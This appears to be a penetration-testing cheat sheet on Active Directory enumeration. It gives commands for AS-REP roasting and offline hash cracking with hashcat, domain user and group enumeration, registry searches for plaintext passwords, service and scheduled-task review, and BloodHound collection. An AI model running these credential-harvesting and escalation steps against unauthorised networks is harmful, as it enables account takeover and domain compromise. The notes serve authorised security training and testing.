# AD: Authenticated Enumeration 

## 1. AS-REP Roasting

**Concept:** Find accounts with Kerberos pre-authentication disabled, request AS-REP hash material, then crack it offline.

**Windows — Rubeus**

```cmd
Rubeus.exe asreproast
```

**Linux — Impacket**

```bash
GetNPUsers.py domain.loc/ -dc-ip DC_IP \
-usersfile users.txt -format hashcat \
-outputfile hashes.txt -no-pass
```

- `-usersfile` — candidate usernames.
    
- `-format hashcat` — output hashes in Hashcat format.
    
- `-outputfile` — save retrieved hashes.
    
- `-no-pass` — do not provide a password.
    

**Crack hashes**

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes.txt --show
```

`-m 18200` = Kerberos 5 AS-REP etype 23.

**Attack path:** Find vulnerable account → Retrieve AS-REP hash → Crack offline → Authenticate with recovered credentials.

**Mitigation:** Enforce Kerberos pre-authentication and use strong passwords.

## 2. Identify Your Context (Windows)

```cmd
whoami
whoami /all
hostname
systeminfo
systeminfo | findstr /B "OS"
systeminfo | findstr /B "Domain"
set
```

- `whoami /all` — user SID, group memberships, privileges.
    
- `hostname` — computer name.
    
- `systeminfo` — OS, domain/workgroup, hotfix information.
    
- `set` — environment variables.
    

PowerShell environment variables:

```powershell
Get-ChildItem Env:
```

**Interesting privileges:** `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`.

## 3. Enumerate Domain Users & Groups

**List domain users**

```cmd
net user /domain
```

**Inspect a user**

```cmd
net user USERNAME /domain
```

Review account status, password dates, group memberships, and logon restrictions.

**List domain groups**

```cmd
net group /domain
```

**Check privileged group membership**

```cmd
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Backup Operators" /domain
```

**List domain computers**

```cmd
net group "Domain Computers" /domain
```

Machine accounts normally end in `$`.

**Enumerate local groups and members**

```cmd
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
```

**Look for:** Unexpected privileged users, unusual group memberships, service accounts, and computer accounts.

## 4. Logged-On Users & Processes

**Logged-on sessions**

```cmd
quser
query user
```

**Running processes**

```cmd
tasklist
tasklist /V
```

**SMB sessions — requires appropriate privileges**

```cmd
net session
```

An active privileged-user session may indicate a valuable machine to investigate. Session visibility does not itself mean that credentials can be extracted.

## 5. Identify Service Accounts

**WMIC**

```cmd
wmic service get Name,StartName
```

**PowerShell equivalent**

```powershell
Get-WmiObject Win32_Service | Select Name,StartName
```

`StartName` identifies the account running the service.

Common service identities:

- `LocalSystem`
    
- `NT AUTHORITY\LocalService`
    
- `NT AUTHORITY\NetworkService`
    
- `NT SERVICE\ServiceName`
    
- `DOMAIN\username`
    

**Enumerate services**

```cmd
sc query state= all
sc query state= all | find "KEYWORD"
sc qc SERVICE_NAME
```

`sc qc` reveals the binary path and service account under `SERVICE_START_NAME`.

**Look for:** Services running as domain accounts, unexpectedly privileged service identities, and accounts with weak or reused passwords.

## 6. Registry & Credential Hunting

**Check Windows auto-logon settings**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

If auto-logon is configured insecurely, `DefaultPassword` may contain a plaintext password.

**List installed applications**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

**Search registry string values for passwords**

```cmd
reg query HKLM /f "password" /t REG_SZ /s
```

Registry access depends on permissions. Review exposed values carefully for credentials and sensitive configuration.

## 7. Scheduled Tasks

**Enumerate tasks**

```cmd
schtasks /query
schtasks /query /fo LIST /v
```

**Inspect:** Task execution account, executable/script path, schedule, and permissions on the referenced files.

A task running with higher privileges may offer an escalation path if its script or executable is writable by your account.

## 8. BloodHound Enumeration

**Concept:** BloodHound maps AD objects and their relationships into a graph to identify potential privilege-escalation paths.

- **SharpHound:** Official Windows data collector.
    
- **BloodHound.py:** Python collector for Linux-based enumeration.
    
- **BloodHound CE:** Imports and visualizes collected data.
    

### Windows — SharpHound

```cmd
SharpHound.exe --CollectionMethods All --Domain domain.loc --ExcludeDCs
```

- `--CollectionMethods All` — collect available data categories.
    
- `--Domain` — target domain.
    
- `--ExcludeDCs` — exclude domain controllers from collection.
    

### Linux — BloodHound.py

```bash
bloodhound-python -u USER -p 'PASSWORD' \
-d domain.loc -ns DC_IP -c All --zip
```

- `-u` / `-p` — credentials.
    
- `-d` — domain.
    
- `-ns` — DNS server IP.
    
- `-c All` — all available collection methods.
    
- `--zip` — package output for import.
    

### Analyze the Results

In BloodHound CE, import the generated ZIP file and investigate:

- **Member Of:** Group memberships.
    
- **Sessions:** Where users have active sessions.
    
- **Local Admin Rights:** Computers a user can administer.
    
- **Outbound Object Control:** Objects the user can modify or control.
    
- **Inbound Object Control:** Accounts or groups that can control the selected object.
    
- **Pathfinding:** Relationships linking your current account to a privileged target.
    

**Important:** Collection can trigger security alerts. Incomplete collection data can also hide attack paths.

---

## Core Workflow

**AS-REP Roast → Identify your account and privileges → Enumerate domain users/groups → Check sessions and services → Search registry and scheduled tasks → Collect BloodHound data → Trace a path to higher privileges.**
